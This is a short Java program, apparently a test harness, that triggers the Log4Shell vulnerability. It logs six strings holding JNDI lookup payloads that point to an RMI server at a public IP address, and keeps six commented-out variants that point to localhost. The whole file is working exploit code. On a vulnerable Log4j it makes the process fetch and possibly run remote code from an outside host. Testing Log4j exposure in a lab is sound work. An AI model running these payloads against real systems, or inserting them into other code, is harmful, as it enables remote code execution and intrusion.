import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTrigger {
    public static void main(String[] args) throws Exception {
        Logger logger = LogManager.getLogger();
        logger.error("Hello JNDI ${jndi:rmi://8.210.117.8:57262/1}");
        logger.error("Hello JNDI ${jndi:rmi://8.210.117.8:57262/2}");
        logger.error("Hello JNDI ${jndi:rmi://8.210.117.8:57262/3}");
        logger.error("Hello JNDI ${jndi:rmi://8.210.117.8:57262/4}");
        logger.error("Hello JNDI ${jndi:rmi://8.210.117.8:57262/5}");
        logger.error("Hello JNDI ${jndi:rmi://8.210.117.8:57262/6}");
//        logger.error("Hello JNDI ${jndi:rmi://127.0.0.1:56697/1}");
//        logger.error("Hello JNDI ${jndi:rmi://127.0.0.1:56697/2}");
//        logger.error("Hello JNDI ${jndi:rmi://127.0.0.1:56697/3}");
//        logger.error("Hello JNDI ${jndi:rmi://127.0.0.1:56697/4}");
//        logger.error("Hello JNDI ${jndi:rmi://127.0.0.1:56697/5}");
//        logger.error("Hello JNDI ${jndi:rmi://127.0.0.1:56697/6}");
    }
}
